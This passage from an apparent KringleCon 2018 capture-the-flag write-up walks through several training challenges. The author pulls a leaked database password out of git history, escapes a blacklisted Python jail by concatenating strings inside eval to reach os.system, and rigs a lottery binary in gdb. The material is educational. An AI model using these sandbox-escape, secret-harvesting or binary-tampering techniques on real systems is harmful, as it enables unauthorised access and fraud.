Whose account was successfully accessed by the attacker's password spray? minty.candycane


MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM
MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM
Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M
MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM
MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM
M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM
MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM
MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM
MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM
MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM
MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM
MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM
MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM
MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM
MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM
M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM
MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM
MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM
MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M
MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM
MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

Silly Minty Candycane, well this is what she gets.
&quot;Winter2018&quot; isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!
</code></pre>

<blockquote>
<p>Well, that explains the odd activity in Minty's account. Thanks for your help!
All of the Kringle Castle employees have these cool cards with QR codes on them that give us access to restricted areas.
Unfortunately, the badge-scan-o-matic said my account was disabled when I tried scanning my badge.
I really needed access so I tried scanning several QR codes I made from my phone but the scanner kept saying "User Not Found".
I researched a SQL database error from scanning a QR code with special characters in it and found it may contain an injection vulnerability.
I was going to try some variations I found on <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">OWASP</a> but decided to stop so I don't tick-off Alabaster.</p>
<p>- Pepper Minstix</p>
</blockquote>
<h3 id="7-dev-ops-fail-sparkle-redberry">7) Dev Ops Fail (Sparkle Redberry)<a class="headerlink" href="#7-dev-ops-fail-sparkle-redberry" title="Permanent link">&para;</a></h3>
<p>We can find this and the next terminal on the second floor, just to the left of the stairs.</p>
<p><img alt="Location" src="7,8-location.png" /></p>
<blockquote>
<p>Hi, I'm Sparkle Redberry!
Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo.
I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it!
Care to check my Cranberry Pi terminal and prove me right?</p>
</blockquote>
<pre><code>                                   .0.                                    
                               .:llOXKllc.                                
                                 .OXXXK,                                  
                                 '0l'cOc                                  
                                 ..';'..                                  
                               .';::::::'.                                
                            .':::::::::::::,.                             
                         .'::loc::::::::::::::,.                          
                      .'::::oMMNc::::::::::::::::,.                       
                    .,;;,,,,:dxl:::::::,,,:::;,,,,,,.                     
                    .,'  ..;:::::::::::;,;::::,.                          
                      .';::::::::::::::::::::dOxc,.                       
                   .';:::::::::okd::::::::::cXMWd:::,.                    
                .';:::::::::::cNMMo:::::::::::lc:::::::,.                 
             .'::::::::::::::::col::::::::::::;:::::::::::,.              
                   .;:::,,,:::::::::::::::::;,,,:::::'.                   
                .'::::::;;;:::::::::::dko:::::;::::::::;.                 
             .,::::::::::::::::::::::lWMWc::::::::::::::::;.              
            ..:00:...;::::loc:::::::::coc::::::::::::'.;;.....            
              :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.                
               .,::::::::cxxl::::,,,:::::::::::::::::::::;.               
            .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.            
         .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.         
       .'''''',:::::x0Oc:::::::::oOOo:::::::::::::::::::::;'''''''.       
            .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;'.            
         .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;'.         
      .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::'.      
   .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'.   
                               ..;;;;;;;;'.                               
                             .';;;;;;;;;;;;'.                             
                          .';;;;;;;;;;;;;;;;;;'.                          
                         ........................                         

Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.
Urging - I scolded, &quot;Don't put creds in git!&quot;
She said, &quot;Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should.&quot;
Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our &quot;oops,&quot;
Please find it fast before some other snoops!
Find Sparkle's password, then run the runtoanswer tool.
</code></pre>

<p>Based on the conversation with Sparkle and the logon message, we should start looking in the commit log for a git repository. After a quick search in elf's home directory, we find out the target repository is in <code>kcconfmgmt</code>.  After reading a summary of all recent commits, we find a particularly interesting one that describes having to remove a username/password combo.</p>
<pre><code>elf@d8857ac2280b:~$ cd kcconfmgmt 
elf@d8857ac2280b:~/kcconfmgmt$ git log --summary
[...snip...]
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 21:11:03 2018 -0500
    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use
 delete mode 100644 server/config/config.js
 create mode 100644 server/config/config.js.def
[...snip...]
</code></pre>

<p>Looking at the differences of this commit reveals the removed username/password combo. <code>git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b</code> shows the change in <code>config.js</code>. The target password is <strong><em>twinkletwinkletwinkle</em></strong> for the username, <code>sredberry</code>.</p>
<pre><code>elf@d8857ac2280b:~/kcconfmgmt$ git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use

diff --git a/server/config/config.js b/server/config/config.js
deleted file mode 100644
index 25be269..0000000
--- a/server/config/config.js
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
-};
diff --git a/server/config/config.js.def b/server/config/config.js.def
new file mode 100644
index 0000000..740eba5
--- /dev/null
+++ b/server/config/config.js.def
@@ -0,0 +1,4 @@
+// Database URL
+module.exports = {
+    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'
+};
</code></pre>

<p>Now we input this password into <code>runtoanswer</code> and complete the exercise.</p>
<pre><code>elf@d8857ac2280b:~$ ./runtoanswer
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't &quot;I told you so&quot; time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
</code></pre>

<blockquote>
<p>Oh my golly gracious - Tangle was right? It was still in there? How embarrassing!
Well, if I can try to redeem myself a bit, let me tell you about another challenge you can help us with.
I wonder if Tangle Coalbox has taken a good look at his own employee import system.
It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had.
I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there.
I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such oploads.</p>
<p>-Sparkle Redberry</p>
</blockquote>
<h3 id="8-python-escape-from-la-sugarplum-mary">8) Python Escape from LA (SugarPlum Mary)<a class="headerlink" href="#8-python-escape-from-la-sugarplum-mary" title="Permanent link">&para;</a></h3>
<p>This exercise is located just north of the last one, on the second floor to the left of the stairs.</p>
<p><img alt="Location" src="7,8-location.png" /></p>
<blockquote>
<p>Hi, I'm Sugarplum Mary.
I'm glad you're here; my terminal is trapped inside a python! Or maybe my python is trapped inside a terminal?
Can you please help me by escaping from the Python interpreter?</p>
</blockquote>
<pre><code>
               :lllllllllllllllllllllllllllllllllllllllll,                      
               'lllllllllllllllllllllllllllllllllllllllll:                      
                clllllllllllllllllllllllllllllllllllllllll.                     
                'lllllllllllllllllllllllllllllllllllllllll:                     
                 ;lllllllllllllllllllllllllllllllllllllllll,                    
                  :lllllllllllllllllllllllllllllllllllllllll.                   
                   :lllllllllllllllllllllllllllllllllllllllll.                  
                    ;lllllllllllllllllllllllllllllllllllllllll'                 
                     'lllllllllllllllllllllllllllllllllllllllll;                
                      .cllllllllllllllllllllllllllllllllllllllllc.              
                      .:llllllllllllllllllllllllllllllllllllllllllc,.           
                   .:llllllllllllllllllllllllllllllllllllllllllllllll;.         
                .,cllllllllllllllllllllllllllllllllllllllllllllllllllll,        
              .;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc.      
             ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.     
           'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc     
          :lllllll:..,..'cllllllllllllllllllllllc'.,'.'clllllllllllllllllll;    
        .clllllll'  :XK.  :llllllllllllllllllll;  ,XX.  ;lllllllllllllllllll.   
       .cllllllll.  oXX'  ,llllllllllllllllllll.  cXX;  .lllllllllllllllllll'   
       clllllllll;  .xl  .cllllllllllllllllllllc.  do  .clllllllllllllllllll,   
      :llllllllllll;'..':llllllllllllllllllllllll:'..':lllllllllllllllllllll'   
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.   
     ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc    
     clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.    
     cllllllllllllllllllllllllll..;lc..:llllllllllllllllllllllllllllllllll;     
     :lllllllllllllllllllllllll:  .l,  .lllllllllllllllllllllllllllllllll:      
     ,lllllllllllllllllllllllllc  .l;  ,llllllllllllllllllllllllllllllll:       
     .llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll,        
      'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.         
       ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,           
        'llllllllllllllllcccccccc;',.,clllllllllllllllllllllllllll,             
         .cllllllc:::::;;,,,,'...':c:;...'',,;;;::::::lllllllllc,               
           'cllllc::;::::cccccccccllc,,,,,,,'',:::::::lllllll;.                 
             .:llllllllllkMMMMMMMMMdlclllllllllollllllllll;.                    
               .':lllllllXMMMMMMMMMoloWMMMMMMMMXllllll:,.                       
                   .,:llccccccccccllllXMMMMMMMMWl:;'.                           
                       .,,,,,,,,,,clll:::::::::;                                
                      'lllllllllc.    ',,,,,,,,.                                
                     lMMMMMMMMMW,    .ddddddddd.                                
                    kMMMMMMMMMX.     kMMMMMMMMK                                 
                   ':::::::::,      .NWWWWWWWW:                                 
                  ',,,,,,,,,.       .,,,,,,,,'                                  
                .oooooooooo.        ',,,,,,,,.                                  
               .NMMMMMMMMW;        cOOOOOOOOx                                   
               0MMMMMMMMMc         NMMMMMMMMk                                   
               ;;;;;;;;;'         .KKKKKKKKK:                                   
              .,,,,,,,,,           ,,,,,,,,,.                                   
              .ddddddddo           ',,,,,,,,.                                   
               XMMMMMMMN           cKKKKKKKKK.                                  
    .;:::;;,,,,,:ldddddd.           0MMMMMMMMX.       ....                      
      .,:ccccccccccccccc            'cccccccccc:::ccccc;.                       
         .:ccccccccccccc            .ccccccccccccccc:'.                         
           .;;;;;;;;;;;;            .ccccccccccccc;.                            
                                    ..............                              




I'm another elf in trouble,
Caught within this Python bubble.

Here I clench my merry elf fist -
Words get filtered by a black list!

Can't remember how I got stuck,
Try it - maybe you'll have more luck?

For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!

-SugarPlum Mary

To complete this challenge, escape Python
and run ./i_escaped
&gt;&gt;&gt; 
</code></pre>

<p>Our goal for this terminal exercise is to simply find a way to run system commands from the Python jailshell. We first attempt to execute system commands using <code>os.system()</code> and to import libraries with <code>import</code>. We find that both of these commands are prohibited by the shell. However, the <code>eval()</code> function is still available, allowing us to bypass this restriction by simply dividing the full command to fool simple blacklist matching.</p>
<pre><code>&gt;&gt;&gt; os.system(&quot;id&quot;)
Use of the command os.system is prohibited for this question.
&gt;&gt;&gt; import os;
Use of the command import is prohibited for this question.
&gt;&gt;&gt; eval
&lt;built-in function eval&gt;
</code></pre>

<p>To perform the blacklist bypass, we first assign the variable <code>os</code> with  <code>__import__("os")</code>. This will allow us to run system commands by using <code>eval()</code> and dividing up the <code>os.system()</code> command within it. Here, we test out this functionality by running <code>id</code>, which successfully provides us with elf's uid.</p>
<pre><code>&gt;&gt;&gt; os = eval('__imp' + 'ort__(&quot;o' + 's&quot;)')
&gt;&gt;&gt; eval('o' + 's.sys' + 'tem(' + '&quot;id&quot;)')
uid=1000(elf) gid=1000(elf) groups=1000(elf)
0
</code></pre>

<p>Now, all we need to do is to replace <code>id</code> with <code>./i_escaped</code> in order to complete this exercise.</p>
<pre><code>&gt;&gt;&gt; eval('o' + 's.sys' + 'tem(' + '&quot;./i_escaped&quot;)')
Loading, please wait......



  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary

You escaped! Congratulations!

0
</code></pre>

<blockquote>
<p>Yay, you did it! You escaped from the Python!
As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.
Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.
Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.
There was suspicious-looking development code using environment variables to store SSL keys and open up directories.
This elf then told me that manipulating values in the URL gave back weird and descriptive errors.
I'm hoping these errors can't be used to compromise SSL on the website and steal logins.
On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!</p>
<p>-SugarPlum Mary</p>
</blockquote>
<h3 id="9-sleigh-bell-lottery-shinny-upatree">9) Sleigh Bell Lottery (Shinny Upatree)<a class="headerlink" href="#9-sleigh-bell-lottery-shinny-upatree" title="Permanent link">&para;</a></h3>
<p>This final exercise is on the second floor, just to the right of the stairs.</p>
<p><img alt="Location" src="9-location.png" /></p>
<blockquote>
<p>Hi, I'm Shinny Upatree.
Hey! Mind giving ole' Shinny Upatree some help? There's a contest I HAVE to win.
As long as no one else wins first, I can just keep trying to win the Sleigh Bell Lotto, but this could take forever!
I'll bet the GNU Debugger can help us. With the PEDA modules installed, it can be prettier. I mean easier.</p>
</blockquote>
<pre><code>                              WKOdl:;oW                                         
                          WOo:'.......cW         X0KXW                          
                kdxOX     x...;.....;c.d      Xd;....':d0W                      
               W,....'cd0WN,.,WNd'...d:'N   Xl........',.:W                     
                l........':odoK  No..,0.k Wx';.....'lOWX.'N                     
                O............,oK   O..O;dWl,d'...;xN   x.o         NXKKKKXN     
                W,.....,:ccc:,..;kW k.dcdd,k'..,kW    0'cW    Xko:'.....:odOKW  
                 d........',;clll:,xWlolx'x;..oN    Wx'lW  Ko;..........,cxK    
                 N,..,codxkkkxdl:::;:xKlx,k.'O     O;,O Ko,....;cdk0KXXXXK0kOW  
                  K,.OW           Xkl':k0:o.O   Wk;:kNk:..'cd0N                 
 W0kdlc:::cloxk0XW Wkc;lx0KNWW       NxlKOxd WOl:dK0l''cdOKK0OOOO0KXNW          
  W  NOo'.........,:oxOkkxlc;,',,,,,,:dK;.dKllx0Oo,;d0XKO0KKXKKKK0OO0KXKKN      
  NOxodkO00KKK0OOkdoc:,'.,:ldxxxxxdddolx;;xdlcc::cx;0K0KKXXXXXX00KK00OOO0K      
             WNXK00000KKKK0kxoodl::::ox,.xlK0kdlccdKOOKXXXK000KKKOOOO00000W     
           X0O0000KXX00000KNK;o;...:0 d,,;lNW      0O0XXK0O0KK0OO0KKK000000     
       NXNK000O0KKKKKXKKXK000kl:cdK WXK0000000KKKNW00KK0O0K0OO0KKK00XXXXK0OW    
      WOOOOOO000000OO0KKKKXXOON  WX0OOO0XXXXXXXKOOOKK0O0K0OOOKK0O0XXXXXXK0OW    
       N000000OOOOO0000OO0XXXX0WXOOKXXXXXXXXXXXKKXX0O0XKOO0K0OOKXXXXXXKX0O0     
       KOKXKOO00000OOOO0KK0OOOK0OOX00KX0KKKKKKK00XXXXOOX0KKO0XXXXXXXXXOO0KW     
       0OKXXKKKKKK000K0OOO0KKKKOO0KKKKK0000000KKKKKK00OONO0XKO0NNXKKXXXXN       
       XOO0KXKO0KKKKKOO0K0O0KXK0KXKKKKKKKK000KKKKKKKKK0KKKK0OOONWXK00OKN        
        0OOW WOOKXXXXKKKK0KNOOOOOKKXXKKKKKKKKKKKKXXKK0OOOOKX00OOO0KXNW          
         KOO0NKOKXXXXXXXX0O0KXKKKKKK000000000000000KKKKKKNW                     
          WKOOXNKKKKKKKKK0OKW KO0XXKKKKKKKXXXXXXXXXXXKOON                       
             NXKNNKOOO00XN    W00KK000K000KXXXXXXXXXKK0X                        
                   WW          WKOOO0   KOKKKXXXXXX0OON                         
                                 NKOO0KKNNXKOOOXXOO0XW                          
                                   WNK0OOO0KXXNNXXN                             
                                        WWWWWW                                  


I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
</code></pre>

<p>Based on the conversation with Shinny and the logon message, our goal for this exercise is to manipulate the <code>sleighbell-lotto</code> program   into letting us win the lottery. Our first step is to see what is available to us and how the program runs. </p>
<pre><code>elf@95d7e6283d56:~$ ls -lah
total 60K
drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:22 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:21 ..
-rw-r--r-- 1 elf  elf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf  3.7K Dec 14 16:21 .bashrc
-rw-r--r-- 1 elf  elf   807 Apr  4  2018 .profile
lrwxrwxrwx 1 elf  elf    12 Dec 14 16:21 gdb -&gt; /usr/bin/gdb
lrwxrwxrwx 1 elf  elf    16 Dec 14 16:21 objdump -&gt; /usr/bin/objdump
-rwxr-xr-x 1 root root  38K Dec 14 16:22 sleighbell-lotto
elf@95d7e6283d56:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 3228!

Sorry - better luck next year!
elf@95d7e6283d56:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 8298!

Sorry - better luck next year!
</code></pre>

<p>From this, we see that the program generates a random integer on each run and compares it with the integer <strong>1225</strong>. We also can use the debugging tools <code>gdb</code> and <code>objdump</code>.  Our first step is to analyze the program using <code>objdump</code> to gain insight into its procedure.</p>
<pre><code>elf@949e7def2ab2:~$ objdump -x sleighbell-lotto | grep .text       
[...snip...]
0000000000000f18 g F .text  00000000000000bf tohex
0000000000000fd7 g F .text  00000000000004e0 winnerwinner
0000000000000b0a g F .text  00000000000000c2 hmac_sha256
0000000000000c43 g F .text  00000000000002d5 base64_decode
00000000000015b0 g F .text  0000000000000065 __libc_csu_init
0000000000000c1e g F .text  0000000000000025 base64_cleanup
00000000000014b7 g F .text  0000000000000013 sorry
0000000000000bcc g F .text  0000000000000052 build_decoding_table
00000000000014ca g F .text  00000000000000e1 main
</code></pre>

<p>Two functions here are important to the task, the <code>winnerwinner</code> function and the <code>main</code> function; each of which plays a key role in a solution. After a quick analysis, we know of two possible solutions for this exercise:</p>
<ol>
<li>Changing the drawing's value to 1225.</li>
<li>Jumping straight to the <code>winnerwinner</code> function.</li>
</ol>
<h5 id="changing-the-drawings-value">Changing the Drawing's Value<a class="headerlink" href="#changing-the-drawings-value" title="Permanent link">&para;</a></h5>
<p>When we're able to use <code>gdb</code>, changing values of variables is a relatively trivial task. We first need to figure out where in memory our variable is, and then we simply set its value to 1225. To start, we load <code>sleighbell-lotto</code> into <code>gdb</code> and then run it once to allow us to set breakpoints in future executions.</p>
<pre><code>elf@95d7e6283d56:~$ gdb sleighbell-lotto
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
[...snip...]
(gdb) run
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 5850!

Sorry - better luck next year!
[Inferior 1 (process 31) exited normally]
</code></pre>

<p>Our next step is to determine where the program performs the comparison between the drawn number and 1225. We call <code>disassemble main</code> in order to examine the <code>main</code> function and see if any comparison operations match what we're looking for. The key identifier will be a comparison between a variable and 1225, or 0x4c9 in hex. After looking through <code>main</code>, the operation at <code>&lt;+184&gt;</code> appears to match what we need.</p>
<pre><code>(gdb) disassemble main
Dump of assembler code for function main:
   0x00005555555554ca &lt;+0&gt;:     push   %rbp
   0x00005555555554cb &lt;+1&gt;:     mov    %rsp,%rbp
   0x00005555555554ce &lt;+4&gt;:     sub    $0x10,%rsp
[...snip...]
   0x000055555555556c &lt;+162&gt;:   mov    $0x0,%eax
   0x0000555555555571 &lt;+167&gt;:   callq  0x5555555548f0 &lt;printf@plt&gt;
   0x0000555555555576 &lt;+172&gt;:   lea    0x584a(%rip),%rdi        # 0x55555555adc7
   0x000055555555557d &lt;+179&gt;:   callq  0x555555554910 &lt;puts@plt&gt;
   0x0000555555555582 &lt;+184&gt;:   cmpl   $0x4c9,-0x4(%rbp)
   0x0000555555555589 &lt;+191&gt;:   jne    0x555555555597 &lt;main+205&gt;
   0x000055555555558b &lt;+193&gt;:   mov    $0x0,%eax
   0x0000555555555590 &lt;+198&gt;:   callq  0x555555554fd7 &lt;winnerwinner&gt;
   0x0000555555555595 &lt;+203&gt;:   jmp    0x5555555555a1 &lt;main+215&gt;
   0x0000555555555597 &lt;+205&gt;:   mov    $0x0,%eax
   0x000055555555559c &lt;+210&gt;:   callq  0x5555555554b7 &lt;sorry&gt;
   0x00005555555555a1 &lt;+215&gt;:   mov    $0x0,%edi
   0x00005555555555a6 &lt;+220&gt;:   callq  0x555555554920 &lt;exit@plt&gt;
End of assembler dump.
</code></pre>

<p>Our next step is to set a breakpoint at that line, in order to let us change the variable's value before the program performs the comparison.</p>
<pre><code>(gdb) break *0x0000555555555582
Breakpoint 1 at 0x555555555582
(gdb) run  
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 309!


Breakpoint 1, 0x0000555555555582 in main ()
</code></pre>

<p>Now, we can set the value of the compared number to 1225 in order to force a win condition.</p>
<pre><code>(gdb) x $rbp-0x4
0x7fffffffe5fc: 0x00000135
(gdb) set {int}($rbp-0x4)=1225
(gdb) x $rbp-0x4
0x7fffffffe5fc: 0x000004c9
</code></pre>

<p>Since the drawn number now equals the winning number, we can continue the program to see the win screen.</p>
<pre><code>(gdb) continue
Continuing.


                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 35) exited normally]
</code></pre>

<h5 id="jumping-to-the-winnerwinner-function">Jumping to the 'winnerwinner' function.<a class="headerlink" href="#jumping-to-the-winnerwinner-function" title="Permanent link">&para;</a></h5>
<p>This method is, arguably, much simpler than the previous method. Rather than attempting to change the value of the drawn number, we just jump to the win screen held in the <code>winnerwinner</code> function. We can do this within <code>gdb</code> through two commands. <code>start</code> lets us begin execution but pauses the program so we can perform the jump. <code>jump winnerwinner</code> performs the actual jump. After this, we immediately see the win screen.</p>
<pre><code>(gdb) start
Temporary breakpoint 1 at 0x5555555554ce
Starting program: /home/elf/sleighbell-lotto 
